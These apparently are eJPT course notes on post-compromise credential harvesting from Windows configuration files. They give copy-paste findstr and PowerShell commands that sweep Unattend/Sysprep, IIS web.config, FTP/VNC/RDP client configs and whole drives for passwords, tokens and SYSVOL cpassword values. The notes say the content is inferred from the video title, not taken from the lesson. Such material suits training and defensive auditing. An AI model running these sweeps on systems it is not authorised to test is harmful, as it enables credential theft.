# 03 - Searching For Passwords In Windows Configuration Files

Note: No transcript was provided. The following summary and commands are inferred conservatively from the video title and module context (05-WindowsCredentialDumping) and reflect common eJPT techniques for harvesting credentials from Windows configuration files.

## What the video covers (Introduction / big picture)
- Goal: Find cleartext or lightly-obfuscated credentials stored in Windows configuration files after initial access.
- Targets: System deployment configs (unattend/sysprep), application configs (web.config, .config, .ini, .xml), user app data (FTP/SSH/RDP clients), and scripts/logs that embed credentials.
- Approach: Use built-in Windows tooling (findstr, PowerShell Select-String) to search known locations and patterns quickly and quietly.

## Flow (ordered)
1. Check high-value deployment configs:
   - C:\Windows\Panther\Unattend.xml, C:\Windows\Sysprep\*, C:\unattend.xml
2. If IIS/.NET present, inspect web.config and applicationHost.config for connection strings and service credentials.
3. Hunt common user/application paths:
   - C:\Users\*, %APPDATA%, C:\ProgramData, C:\Program Files (x86)\, etc.
4. Search broadly for credential keywords across common text-based extensions.
5. Inspect hits, grab surrounding context, and note usernames/hosts/services.
6. If domain-joined, optionally check SYSVOL for Group Policy Preferences (cpassword) on DC shares.
7. Store findings and validate working credentials safely.

## Tools highlighted
- findstr (CMD): Fast, built-in recursive keyword search across files.
- PowerShell Get-ChildItem + Select-String: More flexible recursive search with filtering, context, and output control.
- dir/where (CMD): Enumerate target files for piped searches.
- type/more/notepad: Quick viewing of specific configs.
- Optional domain context: GPP cpassword parsing (covered elsewhere typically).

## Typical command walkthrough (detailed, copy-paste friendly)

### 1) Quick wins: Unattend/Sysprep deployment files
These often contain local admin or domain join credentials in plaintext.

CMD:
```
for %p in ("C:\unattend.xml" "C:\Windows\Panther\Unattend.xml" "C:\Windows\Panther\Unattended.xml" "C:\Windows\System32\Sysprep\unattend.xml" "C:\Windows\Sysprep\sysprep.xml") do @if exist %p (echo [*] %p && findstr /si /n /c:"password" /c:"plaintext" /c:"credentials" "%p")
```

PowerShell:
```
$paths = "C:\unattend.xml","C:\Windows\Panther\Unattend.xml","C:\Windows\Panther\Unattended.xml","C:\Windows\System32\Sysprep\unattend.xml","C:\Windows\Sysprep\sysprep.xml"
$paths | ? { Test-Path $_ } | % { Write-Host "[*]" $_; Select-String -Path $_ -Pattern 'password|plaintext|credentials' -AllMatches -CaseSensitive:$false -Context 1,1 }
```

### 2) IIS / .NET applications
Look for DB connection strings and service accounts in web.config/applicationHost.config.

CMD:
```
findstr /si /n /c:"connectionstring" /c:"password" "C:\inetpub\wwwroot\web.config" 2>nul
findstr /si /n /c:"connectionstring" /c:"password" "C:\Windows\System32\inetsrv\config\applicationHost.config" 2>nul
```

PowerShell:
```
$targets = "C:\inetpub\wwwroot\web.config","C:\Windows\System32\inetsrv\config\applicationHost.config"
$targets | ? { Test-Path $_ } | % { Select-String -Path $_ -Pattern 'connectionstring|password|pwd' -AllMatches -CaseSensitive:$false -Context 1,1 }
```

### 3) App-specific configs commonly leaking creds
- FileZilla: %APPDATA%\FileZilla\sitemanager.xml
- mRemoteNG: %APPDATA%\mRemoteNG\confCons.xml
- WinSCP: %APPDATA%\WinSCP.ini (or registry)
- UltraVNC: C:\Program Files\UltraVNC\ultravnc.ini
- OpenVPN: C:\Program Files\OpenVPN\config\*.ovpn and referenced auth files
- RDP files: C:\Users\*\Documents\*.rdp (may include encrypted password blobs; still useful for targets)

CMD:
```
findstr /si /n /c:"pass" /c:"pwd" "%APPDATA%\FileZilla\sitemanager.xml" 2>nul
findstr /si /n /c:"password" "%APPDATA%\mRemoteNG\confCons.xml" 2>nul
findstr /si /n /c:"password" "%APPDATA%\WinSCP.ini" 2>nul
findstr /si /n /c:"passwd" "C:\Program Files\UltraVNC\ultravnc.ini" 2>nul
for /r "C:\Program Files\OpenVPN\config" %f in (*.ovpn *.txt *.conf) do @findstr /si /n /c:"auth-user-pass" /c:"password" "%f" 2>nul
for /r "C:\Users" %f in (*.rdp) do @findstr /si /n /c:"password" "%f" 2>nul
```

### 4) Broad search across common directories (CMD, robust)
Use where /r to enumerate files by extension, then feed to findstr.

CMD:
```
for /f "delims=" %f in ('where /r "C:\Users" *.config *.xml *.ini *.txt *.conf *.cfg *.ps1 *.bat *.vbs *.log') do @findstr /i /n /p /c:"password" /c:"passwd" /c:"pwd" /c:"user" /c:"username" /c:"credential" /c:"secret" /c:"token" /c:"connectionstring" "%f" 2>nul

for /f "delims=" %f in ('where /r "C:\ProgramData" *.config *.xml *.ini *.txt *.conf *.cfg *.log') do @findstr /i /n /p /c:"password" /c:"pwd" /c:"user" /c:"connectionstring" "%f" 2>nul

for /f "delims=" %f in ('where /r "C:\Program Files" *.config *.xml *.ini *.txt *.conf *.cfg') do @findstr /i /n /p /c:"password" /c:"user" /c:"connectionstring" "%f" 2>nul

for /f "delims=" %f in ('where /r "C:\Program Files (x86)" *.config *.xml *.ini *.txt *.conf *.cfg') do @findstr /i /n /p /c:"password" /c:"user" /c:"connectionstring" "%f" 2>nul

for /f "delims=" %f in ('where /r "C:\inetpub" *.config *.xml *.ini *.txt') do @findstr /i /n /p /c:"connectionstring" /c:"password" "%f" 2>nul
```

Save output to a file:
```
(for /f "delims=" %f in ('where /r "C:\" *.config *.xml *.ini *.txt *.conf *.cfg *.ps1 *.bat *.vbs *.log') do @findstr /i /n /p /c:"password" /c:"pwd" /c:"user" /c:"credential" /c:"connectionstring" "%f" 2>nul) > C:\Users\Public\config_creds.txt
```

### 5) Broad search with PowerShell (flexible and filterable)
PowerShell:
```
$dirs = "C:\Users","C:\ProgramData","C:\Program Files","C:\Program Files (x86)","C:\inetpub","C:\Windows\Panther","C:\Windows\System32\Sysprep"
$exts = "*.config","*.xml","*.ini","*.txt","*.conf","*.cfg","*.ps1","*.bat","*.vbs","*.log","*.ovpn","*.rdp"
$pat  = "password|passwd|pwd|user|username|credential|secret|token|connectionstring|auth"

Get-ChildItem -Path $dirs -Recurse -Include $exts -File -Force -ErrorAction SilentlyContinue |
Where-Object { $_.Length -lt 5MB -and $_.FullName -notmatch "\\Windows\\(WinSxS|SoftwareDistribution|Temp)" } |
Select-String -Pattern $pat -AllMatches -CaseSensitive:$false |
Select-Object Path, LineNumber, Line |
Format-Table -AutoSize -Wrap
```

Save to file with context:
```
Get-ChildItem -Path $dirs -Recurse -Include $exts -File -ErrorAction SilentlyContinue |
Select-String -Pattern $pat -AllMatches -CaseSensitive:$false -Context 1,1 |
Out-File C:\Users\Public\config_hits.txt -Encoding UTF8
```

### 6) Optional: Domain SYSVOL GPP passwords (if applicable)
These are stored on DC shares, not local configs; included here for completeness.

CMD (replace DC or domain UNC accordingly):
```
findstr /si /n /c:"cpassword" \\<domain_or_dc>\SYSVOL\*.xml 2>nul
```

PowerShell:
```
Select-String -Path "\\<domain_or_dc>\SYSVOL\*\Policies\*\Machine\Preferences\*\*.xml" -Pattern 'cpassword' -AllMatches -CaseSensitive:$false
```

### 7) Quick base64 decoding (when values look base64-ish)
PowerShell:
```
$enc = "QWRtaW4xMjMh"; [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($enc))
```

## Practical tips
- Run a terminal as Administrator for broader file access; add 2>nul to suppress Access is denied noise with cmd searches.
- Start with high-signal locations (Unattend/Sysprep, web.config, AppData of common clients) before full-disk searches.
- Use multiple keywords including synonyms and app-specific tokens (password, pwd, passwd, connectionstring, token, secret).
- Restrict by extensions to speed up searches; skip large/binary/WinSxS directories for performance.
- Use Select-String -Context to capture surrounding lines that reveal usernames/hosts.
- Store and sanitize findings: save paths and lines; avoid copying entire files unless needed.
- Some apps obfuscate values (base64, app-specific crypto). Try obvious decodes first; otherwise note and move on.
- Validate carefully and ethically in lab environments; avoid account lockouts.

## Minimal cheat sheet (one-screen flow)
```
:: Unattend/Sysprep
for %p in ("C:\unattend.xml" "C:\Windows\Panther\Unattend.xml" "C:\Windows\System32\Sysprep\unattend.xml" "C:\Windows\Sysprep\sysprep.xml") do @if exist %p (echo [*] %p && findstr /si /n /c:"password" /c:"plaintext" /c:"credentials" "%p")

:: IIS / .NET
findstr /si /n /c:"connectionstring" /c:"password" "C:\inetpub\wwwroot\web.config" 2>nul
findstr /si /n /c:"connectionstring" /c:"password" "C:\Windows\System32\inetsrv\config\applicationHost.config" 2>nul

:: Common app configs
findstr /si /n /c:"pass" "%APPDATA%\FileZilla\sitemanager.xml" 2>nul
findstr /si /n /c:"password" "%APPDATA%\mRemoteNG\confCons.xml" 2>nul
findstr /si /n /c:"password" "%APPDATA%\WinSCP.ini" 2>nul

:: Broad search (CMD via where/findstr)
for /f "delims=" %f in ('where /r "C:\Users" *.config *.xml *.ini *.txt *.conf *.cfg *.ps1 *.bat *.vbs *.log') do @findstr /i /n /p /c:"password" /c:"pwd" /c:"user" /c:"credential" /c:"connectionstring" "%f" 2>nul

:: Broad search (PowerShell)
powershell -nop -c "$dirs='C:\Users','C:\ProgramData','C:\Program Files','C:\Program Files (x86)';$ext='*.config','*.xml','*.ini','*.txt','*.conf','*.cfg','*.ps1','*.bat','*.vbs','*.log';$pat='password|pwd|user|credential|connectionstring|token|secret';gci $dirs -r -inc $ext -file -ea SilentlyContinue|?{$_.Length -lt 5MB}|sls -Pattern $pat -AllMatches -CaseSensitive:$false|select Path,LineNumber,Line"
```

## Summary
- Searching Windows configuration files is a fast, low-noise way to harvest credentials post-compromise.
- Prioritize unattended installation files, IIS/.NET configs, and app-specific configs in user/AppData and ProgramData.
- Use built-in tools: findstr for quick wins; PowerShell Select-String for richer, filtered searches with context.
- Look for common credential patterns and store actionable hits. Decode simple obfuscation when encountered.
- If in a domain context, also consider GPP cpassword in SYSVOL (often covered in a separate lesson).